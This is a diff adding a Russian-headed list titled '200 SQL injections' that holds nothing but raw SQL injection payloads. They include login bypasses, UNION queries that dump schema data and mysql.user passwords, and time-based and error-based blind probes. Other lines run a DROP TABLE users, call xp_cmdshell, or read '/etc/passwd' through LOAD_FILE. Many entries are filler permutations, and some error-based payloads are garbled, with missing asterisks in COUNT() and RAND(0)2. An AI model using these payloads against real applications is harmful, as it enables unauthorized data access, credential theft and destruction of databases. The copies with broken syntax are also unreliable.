@@ -1,0 +1,204 @@
+#200 sql иньекций:
+-------------
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+" OR "1"="1
+" OR "1"="1" --
+' OR 'x'='x
+' OR 'x'='x' --
+') OR ('1'='1
+') OR ('1'='1' --
+' OR 1=1 AND '1'='1
+' OR 1=1 AND '1'='2
+' OR 1=1 ORDER BY 1 --
+' OR 1=1 ORDER BY 2 --
+' OR 1=1 ORDER BY 3 --
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT user(), database(), version() --
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' UNION SELECT table_name FROM information_schema.tables --
+' OR EXISTS(SELECT * FROM users) --
+' OR EXISTS(SELECT 1 FROM dual) --
+' OR 1=1 AND SLEEP(5) --
+' OR 1=1 AND BENCHMARK(1000000,MD5('a')) --
+' OR 1=1 AND pg_sleep(5) --
+' OR 1=1 AND WAITFOR DELAY '0:0:5' --
+' OR 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' OR 1=1 AND RANDOMBLOB(100000000) --
+' OR 1=1 AND extractvalue(1,concat(0x7e,database())) --
+' OR 1=1 AND updatexml(1,concat(0x7e,database()),1) --
+' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(),CONCAT((SELECT database()),FLOOR(RAND(0)2))x FROM information_schema.tables GROUP BY x)a) --
+' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)2))x FROM information_schema.tables GROUP BY x)a) --
+' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(),CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)2))x FROM information_schema.tables GROUP BY x)a) --
+' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(),CONCAT((SELECT user()),FLOOR(RAND(0)2))x FROM information_schema.tables GROUP BY x)a) --
+' OR 1=1; DROP TABLE users; --
+' OR 1=1; SELECT * FROM users --
+' OR 1=1; EXEC xp_cmdshell('dir') --
+' OR 1=1; EXECUTE IMMEDIATE 'SELECT * FROM users' --
+' OR 1=1; DECLARE @q varchar(200); SET @q='SELECT * FROM users'; EXEC (@q) --
+' OR 1=1 UNION SELECT null, null, null, null, null, null --
+' OR 1=1 UNION SELECT 1,2,3,4,5,6 --
+' OR 1=1 UNION SELECT null, null, null, null, null, null, null --
+' OR 1=1 UNION SELECT 1,2,3,4,5,6,7 --
+' OR 1=1 AND 1=1 --
+' OR 1=1 AND 1=2 --
+' OR 1=1 OR 1=2 --
+' OR 1=1 OR 1=1 --
+' OR '1'='1' OR '1'='1
+' OR '1'='1' AND '1'='1
+' OR '1'='1' AND '1'='2
+' OR 'a'='a' AND 'b'='b
+' OR 'a'='a' OR 'b'='c
+' OR 1=1 AND 1=1 ORDER BY 1 --
+' OR 1=1 AND 1=1 ORDER BY 2 --
+' OR 1=1 AND 1=1 LIMIT 1 --
+' OR 1=1 AND 1=1 OFFSET 1 --
+' OR 1=1 AND 1=1 INTO OUTFILE '/tmp/out.txt' --
+' OR 1=1 AND 1=1 INTO DUMPFILE '/tmp/out' --
+' OR 1=1 AND 1=1 LOAD_FILE('/etc/passwd') --
+' OR 1=1 AND 1=1 UNION SELECT LOAD_FILE('/etc/passwd') --
+' OR 1=1 AND 1=1 UNION SELECT @@datadir --
+' OR 1=1 AND 1=1 UNION SELECT @@version_compile_os --
+' OR 1=1 AND 1=1 UNION SELECT @@hostname --
+' OR 1=1 AND 1=1 UNION SELECT current_user() --
+' OR 1=1 AND 1=1 UNION SELECT session_user() --
+' OR 1=1 AND 1=1 UNION SELECT system_user() --
+' OR 1=1 AND 1=1 UNION SELECT user from mysql.user --
+' OR 1=1 AND 1=1 UNION SELECT password from mysql.user --
+' OR 1=1 AND 1=1 UNION SELECT host from mysql.user --
+' OR 1=1 AND 1=1 UNION SELECT db from mysql.db --
+' OR 1=1 AND 1=1 UNION SELECT table_schema from information_schema.tables --
+' OR 1=1 AND 1=1 UNION SELECT table_name from information_schema.tables --
+' OR 1=1 AND 1=1 UNION SELECT column_name from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT data_type from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT is_nullable from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT column_default from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT character_maximum_length from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT numeric_precision from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT numeric_scale from information_schema.columns --
+' OR 1=1 AND 1=1 UNION SELECT constraint_name from information_schema.table_constraints --
+' OR 1=1 AND 1=1 UNION SELECT constraint_type from information_schema.table_constraints --
+' OR 1=1 AND 1=1 UNION SELECT table_name from information_schema.table_constraints --
+' OR 1=1 AND 1=1 UNION SELECT referential_constraints.unique_constraint_name from information_schema.referential_constraints --
+' OR 1=1 AND 1=1 UNION SELECT check_constraints.check_clause from information_schema.check_constraints --
+' OR 1=1 AND 1=1 UNION SELECT views.view_definition from information_schema.views --
+' OR 1=1 AND 1=1 UNION SELECT routines.routine_definition from information_schema.routines --
+' OR 1=1 AND 1=1 UNION SELECT parameters.parameter_name from information_schema.parameters --
+' OR 1=1 AND 1=1 UNION SELECT parameters.data_type from information_schema.parameters --
+' OR 1=1 AND 1=1 UNION SELECT key_column_usage.column_name from information_schema.key_column_usage --
+' OR 1=1 AND 1=1 UNION SELECT key_column_usage.table_name from information_schema.key_column_usage --
+' OR 1=1 AND 1=1 UNION SELECT key_column_usage.constraint_name from information_schema.key_column_usage --
+' OR 1=1 AND 1=1 UNION SELECT referential_constraints.constraint_name from information_schema.referential_constraints --
+' OR 1=1 AND 1=1 UNION SELECT referential_constraints.update_rule from information_schema.referential_constraints --
+' OR 1=1 AND 1=1 UNION SELECT referential_constraints.delete_rule from information_schema.referential_constraints --
+' OR 1=1 AND 1=1 UNION SELECT collations.collation_name from information_schema.collations --
+' OR 1=1 AND '1' like '1' --
+' OR 1=1 AND '1' like '2' --
+' OR 1=1 AND '1' REGEXP '.' --
+' OR 1=1 AND '1' REGEXP '^1$' --
+' OR 1=1 AND 1 BETWEEN 0 AND 2 --
+' OR 1=1 AND 1 IN (1,2,3) --
+' OR 1=1 AND 1 NOT IN (2,3) --
+' OR 1=1 AND 1 IS NOT NULL --
+' OR 1=1 AND 1 IS NULL --
+' OR 1=1 AND 1 DIV 1 = 1 --
+' OR 1=1 AND 1 MOD 1 = 0 --
+' OR 1=1 AND 1 << 1 = 2 --
+' OR 1=1 AND 1 >> 1 = 0 --
+' OR 1=1 AND 1 & 1 = 1 --
+' OR 1=1 AND 1 | 0 = 1 --
+' OR 1=1 AND 1 ^ 0 = 1 --
+' OR 1=1 AND ~1 = -2 --
+' OR 1=1 AND 1 = 1 XOR 0 --
+' OR 1=1 AND 1 = 1 XOR 1 --
+' OR 1=1 AND 1 = 1 && 1 = 1 --
+' OR 1=1 AND 1 = 1 || 0 = 1 --
+' OR 1=1 AND NOT 1 = 2 --
+' OR 1=1 AND NOT 1 = 1 --
+' OR 1=1 AND 1 = 1 AND 2 = 2 --
+' OR 1=1 AND (1=1 OR 1=2) --
+' OR 1=1 AND (1=1 AND 2=2) --
+' OR 1=1 AND (1=1) --
+' OR 1=1 AND (1=2) --
+' OR 1=1 AND (1=1) OR (1=2) --
+' OR 1=1 AND (1=1) OR (1=1) --
+' OR 1=1 AND (SELECT 1 FROM dual) --
+' OR 1=1 AND (SELECT COUNT(*) FROM users) > 0 --
+' OR 1=1 AND (SELECT COUNT(*) FROM users) = 0 --
+' OR 1=1 AND (SELECT COUNT(*) FROM users) < 10 --
+' OR 1=1 AND (SELECT MIN(id) FROM users) = 1 --
+' OR 1=1 AND (SELECT MAX(id) FROM users) = 10 --
+' OR 1=1 AND (SELECT AVG(id) FROM users) > 5 --
+' OR 1=1 AND (SELECT SUM(id) FROM users) > 10 --
+' OR 1=1 AND (SELECT id FROM users ORDER BY id LIMIT 1) = 1 --
+' OR 1=1 AND (SELECT id FROM users WHERE name='admin') = 1 --
+' OR 1=1 AND (SELECT name FROM users WHERE id=1) = 'admin' --
+' OR 1=1 AND (SELECT name FROM users WHERE id=1) LIKE 'a%' --
+' OR 1=1 AND (SELECT name FROM users WHERE id=1) REGEXP '^a' --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password='password') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password LIKE '%pass%') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password REGEXP '.*') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password = '123') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password > '') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password < 'zzz') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password BETWEEN 'a' AND 'z') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password IN ('pass','word')) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password NOT IN ('bad')) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password IS NOT NULL) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND password IS NULL) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' AND 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' OR 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name='admin' OR 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE (name='admin' OR name='guest') AND 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE (name='admin' OR name='guest') AND 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name LIKE 'a%') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name LIKE '%dmin%') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name REGEXP '^[a-z]+$') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name REGEXP '.admin.*') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name RLIKE 'admin') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name SOUNDS LIKE 'admin') --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' COLLATE utf8_general_ci) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' COLLATE utf8_bin) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' COLLATE latin1_general_cs) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' COLLATE utf8_general_ci) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' COLLATE utf8_bin) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' COLLATE latin1_general_cs) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' OR 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' OR 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=1 OR 1=2)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=2 OR 1=1)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=1 AND 1=2)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=2 AND 1=1)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=1 OR 1=1)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND (1=2 OR 1=2)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND NOT 1=2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND NOT 1=1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 BETWEEN 0 AND 2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 IN (1,2,3)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 NOT IN (2,3)) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 IS NOT NULL) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 IS NULL) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 << 1 = 2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 >> 1 = 0) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 & 1 = 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 | 0 = 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 ^ 0 = 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND ~1 = -2) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 = 1 XOR 0) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 = 1 XOR 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 = 1 && 1 = 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND 1 = 1 || 0 = 1) --
+' OR 1=1 AND (SELECT 1 FROM users WHERE name = 'admin' AND password = 'password' AND NOT 1 = 2) --
+
+-------------
